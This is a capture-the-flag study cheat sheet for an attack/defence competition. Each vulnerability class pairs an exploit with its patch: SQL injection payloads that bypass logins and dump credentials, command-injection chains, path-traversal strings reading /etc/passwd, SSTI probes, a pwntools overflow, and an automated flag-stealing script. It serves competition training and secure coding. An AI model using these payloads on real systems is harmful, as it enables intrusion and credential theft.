# iHack A/D — Master Cheat Sheet

Everything in one place: the game, the rules, what to learn (with videos), the vuln playbook, and commands. Study from it now, use it on game day. Swap in the real flag format + ports from README when the game starts.

## 0. The game in one picture

- **Attack:** find a vuln on your own box -> the same vuln is on every enemy box -> run your exploit at all enemy IPs -> steal their flags.
- **Defend:** find that same vuln on your box -> patch the code -> keep the service running (down = 0 points).
- **Where:** the pwnbox (opens in your browser) is your workstation. Services run as **docker containers**. You attack from the pwnbox terminal; you go into your own container to patch.
- Flags refresh every tick (~few min), so you automate your exploit to re-steal.

## 1. Rules — don't get disqualified

- No scanning enemies (no nmap, gobuster, dirb) — all targets are provided
- At least **2 second delay** in any attack loop (no flooding)
- Defend by **patching code only** — no firewall / IP blocking
- Never crash or DoS an enemy service — steal gently
- All work **inside the pwnbox**; search only in the pwnbox browser
- **No AI during the game** (pre-made scripts are fine, live AI is not); phone banned

## 2. Learn it — YouTube + labs, in order

> Watching teaches ~30%, doing a PortSwigger lab teaches ~70%. Always do the lab.

1. **SQL injection** -> YouTube: PwnFunction "SQL Injection" -> PortSwigger SQLi labs  (START HERE)
2. **Command injection** -> PortSwigger command-injection labs
3. **Path traversal** -> PortSwigger path-traversal labs
4. **searchsploit workflow** -> practice: find an app version, then find its exploit
5. **Buffer overflow (pwn)** -> only if web is solid, or your teammate owns it

Nail #1 and #2 by hand and you can genuinely play. Split with your teammate: you take web, they take binary.

---

# 3. Vuln playbook — Spot -> Exploit -> Patch

## SQL injection (learn first)

**Spot** — user input glued into a SQL query:
```python
q = "SELECT * FROM users WHERE name='" + name + "'"   # vulnerable
```

**Exploit** — annotated payloads:
```sql
'                      # single quote: if the page breaks, it's injectable
admin' --              # login bypass: log in as admin, -- kills the password check
' OR 1=1 --            # WHERE always true -> returns first user (often admin)
' ORDER BY 1 --        # count columns: try 1,2,3... last one before an error = column count
' UNION SELECT 1,2,3 -- # shows which columns print on the page
' UNION SELECT username,password,3 FROM users --   # dump creds
' UNION SELECT flag,2,3 FROM flags --              # grab the flag
' UNION SELECT table_name,2,3 FROM information_schema.tables --   # list tables
```
Comment syntax: `--` (space after), `#` (MySQL), `/* */` (inline).

**Patch** — parameterize, input can never become code:
```python
cur.execute("SELECT * FROM users WHERE name = %s", (name,))
```

## Command injection

**Spot** — input passed to a shell command:
```python
os.system("ping " + host)        # vulnerable
```
**Exploit** — chain your own command on:
```
; id        | id        $(cat /flag)        `cat /flag`
```
**Patch** — no shell, pass args as a list:
```python
subprocess.run(["ping", "-c", "1", host])   # no shell=True
```

## Path traversal / file read

**Spot** — a filename from the user used to open a file:
```python
open("files/" + filename)         # vulnerable
```
**Exploit** — climb out of the folder:
```
../../../../etc/passwd
../../flag.txt
```
**Patch** — confine to a safe base dir:
```python
path = os.path.normpath(os.path.join(BASE, filename))
if not path.startswith(BASE): abort(403)
```

## Auth bypass / IDOR

**Spot** — an object ID in the URL you can change, or weak login logic (`/account?id=1` -> try `id=2`).
**Exploit** — read another user's data by changing the ID; try default creds (admin/admin); abuse logic flaws.
**Patch** — check the logged-in user owns the object; fix the auth check so it can't be skipped.

## SSTI (template injection)

**Spot** — user input rendered inside a template (Flask / Jinja2).
**Test** — send `{{7*7}}`; if the page shows `49`, it's vulnerable.
**Exploit** — escalate to read config / run commands (`{{config}}`, then Jinja RCE payloads).
**Patch** — never render user input as a template; pass it as data to a fixed template.

## Buffer overflow (pwn)

**Spot** — unsafe input functions, read in Ghidra:
```c
char buf[64];
gets(buf);        // or strcpy, scanf("%s")  -- vulnerable
```
**Exploit** — overflow to control the return address (Ghidra to read, pwntools to build):
```python
from pwn import *
p = remote(ip, port)
offset = 72                       # find with cyclic()
p.sendline(b"A" * offset + p64(win_addr))   # win_addr from Ghidra
print(p.recvall())
```
**Patch** — bound the input, recompile: `fgets(buf, sizeof(buf), stdin);`

## Outdated app (public exploit)

**Spot** — identify the app name + version (footer, HTTP headers, login page).
**Exploit** — find the ready-made exploit:
```
searchsploit <appname>
searchsploit <appname> <version>   # then run the PoC it points to
```
**Patch** — apply the known fix / update the component / disable the vulnerable feature.

---

# 4. Commands

## Recon — YOUR OWN box only (never scan enemies)
```
docker ps              # running service containers + ports  (main one)
ss -tlnp               # listening ports + process
cat README.txt         # flag format, submission, services  (read FIRST on game day)
cd /team               # your team's shared folder
```

## Get inside a service
```
docker exec -it <name> bash     # shell inside the container
docker cp <name>:/app ./app     # copy its files out to read
grep -rnE "os.system|subprocess|eval|SELECT|open\(" .   # hunt dangerous patterns
```

## Attack (manual test)
```
curl http://TARGET:PORT/path
curl -X POST -d "user=admin&pass=x" http://TARGET:PORT/login
```

## Defend (patch + verify)
```
cp vuln.py vuln.py.bak          # back up before editing
nano vuln.py                    # fix the bug
docker restart <name>           # load the fix
curl http://localhost:PORT/     # confirm it still works (SLA)
```

## Monitor your own traffic
```
sudo tcpdump -i any -A port <PORT>    # watch attacks -> steal their exploit
```

## Keep things running
```
tmux new -s ad     # start | Ctrl+b d detach | tmux attach -t ad reattach
```

---

# 5. Exploit template (Python)

Save as `exploit.py`; it prints the flag(s) to stdout (what DestructiveFarm reads):
```python
#!/usr/bin/env python3
import sys, re, requests

TARGET = sys.argv[1]          # enemy IP
PORT   = "10001"             # from your own docker ps
URL    = f"http://{TARGET}:{PORT}"
FLAG_RE = re.compile(r"FLAG\{[^}]+\}")   # set to the real flag format

def exploit():
    r = requests.get(f"{URL}/search", params={"q": "' OR 1=1-- -"}, timeout=5)
    return FLAG_RE.findall(r.text)

if __name__ == "__main__":
    for flag in exploit():
        print(flag)
```
Run: `python3 exploit.py 10.0.0.5` — then plug into DestructiveFarm (with a >=2s delay) to hit all teams.
